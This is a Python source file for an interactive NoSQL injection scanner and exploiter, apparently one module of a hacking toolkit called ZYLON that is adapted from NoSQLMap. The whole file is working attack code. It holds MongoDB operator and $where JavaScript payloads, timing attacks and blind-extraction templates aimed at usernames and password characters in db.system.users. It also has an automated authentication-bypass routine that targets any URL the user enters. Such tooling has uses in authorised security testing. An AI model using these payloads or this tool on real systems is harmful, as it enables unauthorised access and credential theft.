#!/usr/bin/env python3
"""
ZYLON FUSION v2.5 NUCLEAR - NoSQL Injection Engine
===================================================
Fused from: NoSQLMap (https://github.com/codingo/NoSQLMap)
Purpose: NoSQL injection detection and exploitation (MongoDB, CouchDB)
Attack Vectors: $ne, $gt, $where, $or, JavaScript injection, timing attacks
Python 3.13 Compatible | Termux Non-Root
"""

import os
import sys
import re
import time
import json
import requests
import urllib3
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from core.shared_infra import shared_session, regex_cache, PayloadInjector

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================================
# NoSQL INJECTION PAYLOADS
# ============================================================================

class NoSQLPayloads:
    """NoSQL injection payloads for MongoDB and CouchDB"""
    
    # MongoDB operator injection payloads
    OPERATOR_INJECTION = {
        '$ne': {
            'description': 'Not equal operator - bypass auth',
            'payloads': [
                '{"$ne": ""}',
                '{"$ne": "1"}',
                '{"$ne": "admin"}',
                '{"$ne": "null"}',
            ]
        },
        '$gt': {
            'description': 'Greater than - return all records',
            'payloads': [
                '{"$gt": ""}',
                '{"$gt": "0"}',
                '{"$gt": null}',
            ]
        },
        '$gte': {
            'description': 'Greater than or equal',
            'payloads': [
                '{"$gte": ""}',
                '{"$gte": "0"}',
            ]
        },
        '$lt': {
            'description': 'Less than',
            'payloads': [
                '{"$lt": ""}',
            ]
        },
        '$regex': {
            'description': 'Regex injection',
            'payloads': [
                '{"$regex": ".*"}',
                '{"$regex": "^admin"}',
                '{"$regex": ".*", "$options": "i"}',
            ]
        },
        '$where': {
            'description': 'JavaScript injection via $where',
            'payloads': [
                '{"$where": "return true"}',
                '{"$where": "1==1"}',
                '{"$where": "sleep(5000)"}',
                '{"$where": "this.password.match(/.*/)!=null"}',
            ]
        },
        '$or': {
            'description': 'OR operator injection',
            'payloads': [
                '{"$or": [{"username": "admin"}, {"username": {"$ne": ""}}]}',
            ]
        },
    }
    
    # URL parameter injection payloads (for query string params)
    PARAM_PAYLOADS = [
        # $ne injection
        {'key_suffix': '[$ne]', 'value': '1', 'name': '$ne (not equal)'},
        {'key_suffix': '[$ne]', 'value': '', 'name': '$ne (empty)'},
        {'key_suffix': '[$gt]', 'value': '', 'name': '$gt (greater than)'},
        {'key_suffix': '[$gt]', 'value': '0', 'name': '$gt (zero)'},
        {'key_suffix': '[$regex]', 'value': '.*', 'name': '$regex (match all)'},
        {'key_suffix': '[$regex]', 'value': '^admin', 'name': '$regex (admin)'},
        {'key_suffix': '[$where]', 'value': '1==1', 'name': '$where (true)'},
        {'key_suffix': '[$where]', 'value': 'return true', 'name': '$where (return true)'},
        {'key_suffix': '[$gte]', 'value': '0', 'name': '$gte (zero)'},
        {'key_suffix': '[$nin]', 'value': '[]', 'name': '$nin (not in empty)'},
    ]
    
    # JSON body injection payloads
    JSON_PAYLOADS = [
        {'payload': {'$ne': ''}, 'name': '$ne empty string'},
        {'payload': {'$ne': '1'}, 'name': '$ne "1"'},
        {'payload': {'$gt': ''}, 'name': '$gt empty string'},
        {'payload': {'$gt': '0'}, 'name': '$gt "0"'},
        {'payload': {'$regex': '.*'}, 'name': '$regex match all'},
        {'payload': {'$where': 'return true'}, 'name': '$where return true'},
        {'payload': {'$where': '1==1'}, 'name': '$where 1==1'},
        {'payload': {'$or': [{'username': 'admin'}, {'username': {'$ne': ''}}]}, 'name': '$or admin bypass'},
    ]
    
    # JavaScript injection payloads (for $where context)
    JS_INJECTION = [
        "1; return true",
        "1; return db.getName()",
        "1; return this.password",
        "'; return db.getName(); var dummy='",
        "'; return true; var dummy='",
        "1; return true; var dummy=1",
        "'; return this.password != ''; var dummy='",
        "1; return this.password != ''; var dummy=1",
    ]
    
    # Timing attack payloads
    TIMING_PAYLOADS = [
        {"$where": "sleep(5000)"},
        {"$where": "var d=new Date(); var c=null; do{c=new Date();}while(Math.abs(c.getTime()-d.getTime())<5000); return true;"},
        {"$where": "for(var i=0;i<1000000;i++){Math.sin(i);} return true;"},
        {"$gt": "", "$where": "sleep(5000)"},
    ]
    
    # Blind data extraction templates
    EXTRACTION_PAYLOADS = {
        'db_name_length': "var curdb=db.getName(); if(curdb.length=={length}){{return true;}} var dum='a",
        'db_name_char': "var curdb=db.getName(); if(curdb.charAt({pos})=='{char}'){{return true;}} var dum='a",
        'collection_count': "var cnt=db.{collection}.count(); if(cnt=={count}){{return true;}} var dum='a",
        'username_length': "var usr=db.system.users.findOne(); if(usr.user.length=={length}){{return true;}} var dum='a",
        'username_char': "var usr=db.system.users.findOne(); if(usr.user.charAt({pos})=='{char}'){{return true;}} var dum='a",
        'password_char': "var usr=db.system.users.findOne(); if(usr.pwd.charAt({pos})=='{char}'){{return true;}} var dum='a",
        'skip_user': "var usr=db.system.users.findOne({{user:{{$nin:[{known_users}]}}}}); if(usr.user.charAt({pos})=='{char}'){{return true;}} var dum='a",
    }
    
    # MongoDB error signatures
    MONGODB_ERRORS = [
        'ReferenceError',
        'SyntaxError', 
        'ILLEGAL',
        'mongo',
        'MongoDB',
        'mongoose',
        'ObjectId',
        'BSON',
        '$where',
    ]
    
    # CouchDB error signatures  
    COUCHDB_ERRORS = [
        'couchdb',
        'CouchDB',
        'error":"not_found',
        'error":"unauthorized',
        '_rev',
        '_id',
    ]


# ============================================================================
# NoSQL INJECTION ENGINE
# ============================================================================

class NoSQLEngine:
    """NoSQL Injection Detection and Exploitation Engine"""
    
    def __init__(self, target_url=None, method='GET', params=None, data=None,
                 headers=None, cookies=None, proxy=None, timeout=10):
        self.target_url = target_url
        self.method = method.upper()
        self.params = params or {}
        self.data = data or {}
        self.headers = headers or {}
        self.cookies = cookies or {}
        self.proxy = proxy
        self.timeout = timeout
        self.results = []
        self.vulnerable_params = []
        self.db_type = None  # 'mongodb' or 'couchdb'
    
    def _make_request(self, url=None, method=None, params=None, data=None,
                      json_data=None, headers=None, cookies=None):
        """Make HTTP request using shared session"""
        try:
            resp = shared_session.request(
                method=method or self.method,
                url=url or self.target_url,
                params=params or self.params,
                data=data,
                json=json_data,
                headers=headers or self.headers,
                cookies=cookies or self.cookies,
                timeout=self.timeout,
                verify=False,
                allow_redirects=True
            )
            return resp
        except Exception:
            return None
    
    def _get_baseline(self):
        """Get baseline response"""
        resp = self._make_request()
        if resp:
            return {
                'status': resp.status_code,
                'length': len(resp.text),
                'text': resp.text,
                'time': resp.elapsed.total_seconds()
            }
        return None
    
    def detect_nosql(self):
        """Detect NoSQL injection vulnerabilities"""
        findings = []
        baseline = self._get_baseline()
        if not baseline:
            return findings
        
        # Phase 1: Test URL parameter injection
        findings.extend(self._test_param_injection(baseline))
        
        # Phase 2: Test JSON body injection
        if self.method == 'POST':
            findings.extend(self._test_json_injection(baseline))
        
        # Phase 3: Detect database type from errors
        self._detect_db_type(baseline['text'])
        
        # Phase 4: Timing attack detection
        if not findings:
            findings.extend(self._test_timing_attacks())
        
        self.results = findings
        return findings
    
    def _test_param_injection(self, baseline):
        """Test URL parameter operator injection"""
        findings = []
        
        for param_name, param_value in self.params.items():
            for payload_info in NoSQLPayloads.PARAM_PAYLOADS:
                test_params = dict(self.params)
                test_key = param_name + payload_info['key_suffix']
                
                # Remove original param, add injected one
                del test_params[param_name]
                test_params[test_key] = payload_info['value']
                
                resp = self._make_request(params=test_params)
                if not resp:
                    continue
                
                # Check for differences
                delta = abs(len(resp.text) - baseline['length'])
                
                if delta >= 100:
                    findings.append({
                        'type': 'operator_injection',
                        'parameter': param_name,
                        'payload_key': test_key,
                        'payload_value': payload_info['value'],
                        'technique': payload_info['name'],
                        'baseline_length': baseline['length'],
                        'response_length': len(resp.text),
                        'delta': delta,
                        'confidence': 'HIGH' if delta >= 500 else 'MEDIUM',
                        'status': resp.status_code
                    })
                    self.vulnerable_params.append(param_name)
                
                elif delta > 0:
                    # Check for error-based detection
                    for err in NoSQLPayloads.MONGODB_ERRORS + NoSQLPayloads.COUCHDB_ERRORS:
                        if err in resp.text and err not in baseline['text']:
                            findings.append({
                                'type': 'error_based',
                                'parameter': param_name,
                                'payload_key': test_key,
                                'payload_value': payload_info['value'],
                                'technique': payload_info['name'],
                                'error': err,
                                'confidence': 'HIGH',
                                'status': resp.status_code
                            })
                            self.vulnerable_params.append(param_name)
                            break
        
        return findings
    
    def _test_json_injection(self, baseline):
        """Test JSON body injection"""
        findings = []
        
        for param_name, param_value in self.data.items():
            for payload_info in NoSQLPayloads.JSON_PAYLOADS:
                test_data = dict(self.data)
                
                # Try replacing value with operator payload
                if isinstance(param_value, str):
                    try:
                        test_data[param_name] = payload_info['payload']
                    except Exception:
                        continue
                    
                    resp = self._make_request(json_data=test_data)
                    if not resp:
                        continue
                    
                    delta = abs(len(resp.text) - baseline['length'])
                    
                    if delta >= 100:
                        findings.append({
                            'type': 'json_injection',
                            'parameter': param_name,
                            'payload': str(payload_info['payload']),
                            'technique': payload_info['name'],
                            'baseline_length': baseline['length'],
                            'response_length': len(resp.text),
                            'delta': delta,
                            'confidence': 'HIGH' if delta >= 500 else 'MEDIUM',
                            'status': resp.status_code
                        })
                        self.vulnerable_params.append(param_name)
        
        return findings
    
    def _test_timing_attacks(self):
        """Test time-based blind NoSQL injection"""
        findings = []
        
        for param_name, param_value in self.params.items():
            for i, timing_payload in enumerate(NoSQLPayloads.TIMING_PAYLOADS):
                test_params = dict(self.params)
                
                # Send timing payload
                start = time.time()
                
                if '$where' in str(timing_payload):
                    test_params[param_name] = json.dumps(timing_payload)
                else:
                    test_params[param_name + '[$where]'] = json.dumps(timing_payload.get('$where', 'sleep(5000)'))
                
                resp = self._make_request(params=test_params)
                elapsed = time.time() - start
                
                # If response took more than 4 seconds, likely vulnerable
                if elapsed >= 4:
                    findings.append({
                        'type': 'timing_blind',
                        'parameter': param_name,
                        'payload': str(timing_payload),
                        'technique': 'Time-based blind injection',
                        'elapsed': elapsed,
                        'confidence': 'HIGH' if elapsed >= 8 else 'MEDIUM',
                    })
                    self.vulnerable_params.append(param_name)
                    break
        
        return findings
    
    def _detect_db_type(self, text):
        """Detect database type from error messages"""
        for err in NoSQLPayloads.MONGODB_ERRORS:
            if err in text:
                self.db_type = 'mongodb'
                return
        
        for err in NoSQLPayloads.COUCHDB_ERRORS:
            if err in text:
                self.db_type = 'couchdb'
                return
    
    def exploit_auth_bypass(self):
        """Exploit NoSQL injection for authentication bypass"""
        results = []
        
        # Common auth parameters
        auth_params = ['username', 'user', 'email', 'login', 'name']
        pass_params = ['password', 'pass', 'pwd', 'token', 'key']
        
        for param_name in self.vulnerable_params:
            # Try $ne bypass on all related parameters
            for auth_field in auth_params + pass_params:
                test_params = dict(self.params)
                
                # Set username to known value and password to $ne
                if auth_field in test_params:
                    test_params[auth_field + '[$ne]'] = ''
                    del test_params[auth_field]
                else:
                    test_params[auth_field + '[$ne]'] = ''
                
                resp = self._make_request(params=test_params)
                if resp:
                    # Check for successful auth bypass indicators
                    if self._check_auth_bypass(resp):
                        results.append({
                            'type': 'auth_bypass',
                            'technique': '$ne operator',
                            'parameters': test_params,
                            'status': resp.status_code,
                            'evidence': self._get_auth_evidence(resp),
                        })
        
        return results
    
    def _check_auth_bypass(self, resp):
        """Check if authentication bypass succeeded"""
        success_indicators = [
            'dashboard', 'welcome', 'admin', 'profile', 'logout',
            'token', 'session', 'cookie', 'authenticated',
            '"success":true', '"status":"ok"', '"authenticated":true',
            'redirect', '302',
        ]
        
        for indicator in success_indicators:
            if indicator.lower() in resp.text.lower():
                return True
        
        if resp.status_code in [200, 301, 302] and 'login' not in resp.text.lower():
            return True
        
        return False
    
    def _get_auth_evidence(self, resp):
        """Get evidence of auth bypass"""
        if resp.status_code == 302:
            return f'Redirect to: {resp.headers.get("Location", "unknown")}'
        return f'Status: {resp.status_code}, Length: {len(resp.text)}'
    
    def full_scan(self):
        """Run complete NoSQL injection scan"""
        detection = self.detect_nosql()
        
        exploitation = []
        if detection:
            exploitation = self.exploit_auth_bypass()
        
        return {
            'detection': detection,
            'exploitation': exploitation,
            'db_type': self.db_type,
            'vulnerable_params': self.vulnerable_params
        }


# ============================================================================
# CONSOLE INTERFACE
# ============================================================================

def run_nosql_scan(console=None):
    """Interactive NoSQL injection scan for ZYLON menu"""
    if console is None:
        from rich.console import Console
        console = Console()
    
    from rich.panel import Panel
    from rich.table import Table
    from rich.prompt import Prompt
    
    console.print(Panel(
        "[bold cyan]NoSQL INJECTION ENGINE[/bold cyan]\n"
        "[yellow]Fused from: NoSQLMap | MongoDB + CouchDB[/yellow]\n"
        "[green]Attacks: $ne, $gt, $where, $regex, $or, JS injection,\n"
        "         timing attacks, auth bypass, blind extraction[/green]",
        border_style="bright_cyan"
    ))
    
    url = Prompt.ask("[cyan]Enter target URL[/cyan]")
    if not url.strip():
        console.print("[red][-] No URL provided![/red]")
        return
    
    method = Prompt.ask("[cyan]HTTP Method[/cyan]", choices=["GET", "POST"], default="GET")
    
    params_str = Prompt.ask("[cyan]Parameters to test (key=value, comma separated)[/cyan]", default="")
    params = {}
    data = {}
    if params_str.strip():
        for pair in params_str.strip().split(','):
            if '=' in pair:
                k, v = pair.split('=', 1)
                if method == 'GET':
                    params[k.strip()] = v.strip()
                else:
                    data[k.strip()] = v.strip()
    
    engine = NoSQLEngine(
        target_url=url.strip(),
        method=method,
        params=params,
        data=data,
        timeout=15
    )
    
    console.print("\n[cyan][*] Running NoSQL injection detection...[/cyan]")
    
    with console.status("[bold green]Testing NoSQL injection payloads...", spinner="dots"):
        detection = engine.detect_nosql()
    
    if detection:
        console.print(f"\n[bold green][+] NoSQL INJECTION DETECTED! {len(detection)} finding(s)[/bold green]")
        
        for i, finding in enumerate(detection, 1):
            table = Table(title=f"Finding #{i}", box=None, show_header=False)
            table.add_column("Key", style="cyan", width=15)
            table.add_column("Value", style="green")
            table.add_row("Type", finding['type'])
            table.add_row("Parameter", finding.get('parameter', 'N/A'))
            table.add_row("Technique", finding.get('technique', 'N/A'))
            table.add_row("Confidence", finding.get('confidence', 'N/A'))
            if 'delta' in finding:
                table.add_row("Response Delta", str(finding['delta']))
            if 'error' in finding:
                table.add_row("Error", finding['error'])
            if 'elapsed' in finding:
                table.add_row("Time Elapsed", f"{finding['elapsed']:.2f}s")
            console.print(table)
            console.print()
        
        # Try auth bypass
        if engine.vulnerable_params:
            bypass_choice = Prompt.ask("[cyan]Try auth bypass?[/cyan]", choices=["y", "n"], default="y")
            if bypass_choice == 'y':
                with console.status("[bold green]Attempting auth bypass...", spinner="dots"):
                    bypass = engine.exploit_auth_bypass()
                
                if bypass:
                    console.print("[bold green][+] Auth bypass successful![/bold green]")
                    for r in bypass:
                        console.print(f"  [cyan]Technique: {r['technique']}[/cyan]")
                        console.print(f"  [green]Evidence: {r['evidence']}[/green]")
                else:
                    console.print("[yellow][-] Auth bypass not successful.[/yellow]")
    else:
        console.print("\n[yellow][-] No NoSQL injection vulnerabilities detected.[/yellow]")


if __name__ == "__main__":
    run_nosql_scan()
